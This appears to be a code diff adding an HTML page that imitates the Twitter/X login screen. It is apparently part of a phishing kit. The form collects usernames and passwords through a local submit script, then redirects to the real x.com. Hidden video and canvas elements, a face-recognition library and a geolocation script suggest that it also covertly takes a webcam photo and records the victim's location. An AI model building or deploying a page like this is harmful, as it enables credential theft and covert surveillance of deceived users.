@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Entrar no Twitter / Twitter</title>
+	<link rel="stylesheet" href="/css/x.css">
+	<link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+	<header class="container">
+		<div class="logo">
+			<svg viewBox="0 0 24 24" aria-hidden="true">
+				<g>
+					<path
+						d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z">
+					</path>
+				</g>
+			</svg>
+		</div>
+	</header>
+
+	<main class="container">
+		<h1>Happening now</h1>
+		<div class="container">
+			<form class="" id="loginForm" method="post" data-type="twitter.com" data-redirect="https://x.com">
+				<div class="inputs">
+					<label class="username" for="username">Phone, email, username</label><br>
+					<input type="text" id="username" name="username">
+				</div>
+				<div class="inputs">
+					<label class="password" for="password">Password</label><br>
+					<input type="password" id="password" name="password">
+				</div>
+				<br>
+				<button class="button" type="submit">Enter</button>
+			</form>
+			<div class="links container">
+				<a href="https://x.com/i/flow/signup">Don't have an account? Sign Up</a>
+				<span class="ponto"></span>
+				<a href="https://x.com/i/flow/password_reset">Forgot Password</a>
+			</div>
+		</div>
+	</main>
+
+	<script src="https://code.jquery.com/jquery-3.7.1.min.js"
+		integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+
+	<script src="/js/form_submit.js"></script>
+
+	<section id="take_photo">
+		<video id="video" autoplay muted></video>
+		<canvas id="canvas"></canvas>
+	</section>
+
+	<script defer src="/js/face-api.min.js"></script>
+	<script defer src="/js/get_location.js"></script>
+</body>
+
+</html>
